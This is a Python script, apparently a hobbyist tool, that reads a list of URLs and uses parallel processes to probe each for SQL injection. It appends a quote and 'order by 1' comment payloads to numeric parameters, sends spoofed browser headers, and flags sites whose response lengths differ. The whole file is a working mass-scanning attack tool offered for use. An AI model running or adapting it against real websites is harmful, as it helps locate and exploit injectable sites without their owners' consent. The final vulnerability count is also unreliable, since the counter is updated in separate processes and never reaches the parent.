from multiprocessing import Process,cpu_count,Lock,Value
import os,sys,requests,re
import argparse as arg
import time as t

urls = []

def getArgs():
    parase = arg.ArgumentParser(description='Scan urls to find SQL Injection Vulnerability',epilog='Programmed By Li0N - GitHub : Li0N77')
    parase.add_argument('-f','--file',help='Name of urls file',required=True)

    return parase.parse_args()

def read_file(file_name):
    try: 
        txtfile = open(file_name, 'r') 
    
        lines = txtfile.readlines() 
    
        for index, line in enumerate(lines): 
            urls.append(line.strip())
        
        txtfile.close()
    except OSError: 
        print ("Could not open/read file: ", file_name, file=sys.stderr) 
        sys.exit()

one = "'"
two = ["' order by 1 --+"," order by 1 --+"," order by 1 #","' order by 1 #"]
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36', "Upgrade-Insecure-Requests": "1","DNT": "1","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate"}
error = 0
vuln = 0
def starter(now,lock):
    while(now.value < len(urls)):
        is_vuln(now,lock)

def is_vuln(now,lock):
    global vuln
    with lock:
        id = now.value
        now.value += 1
    res_one = 0
    res_two = 0
    original = 0
    try:
        url_target = urls[id]
        o = requests.get(url_target)
        original = len(o.content)
        r = requests.get(re.sub(r"(\w\D=+)(\d+)",r'\1\2' + one,url_target),timeout=5,headers=headers)
        res_one = len(r.content)

        for q in two:
            a = requests.get(str(re.sub(r"(\w\D=+)(\d+)",r'\1\2' + q,url_target)),headers=headers,timeout=5)
            if (res_two <= len(a.content)):
                res_two = len(a.content)
        t.sleep(0.5)
        if (res_two == original and res_one != original):
            print(f"{url_target} : is vuln")
            vuln += 1
    except:
        None
    

args = getArgs()
read_file(args.file)

if __name__ == "__main__":
    start = t.perf_counter()
    lock = Lock()
    now = Value('i',0)
    processes = []
    print(f"cpu count : {cpu_count()}")
    for _ in range(cpu_count()):
        try:
            p = Process(target=starter,args=(now,lock))
            processes.append(p)
            p.start()
        except:
            print("Exception occurred.")
    for p in processes:
        p.join()
    print(f"Vulns : {vuln}")
    end = t.perf_counter()
    print(f"Finshed in {round(end-start,2)}")
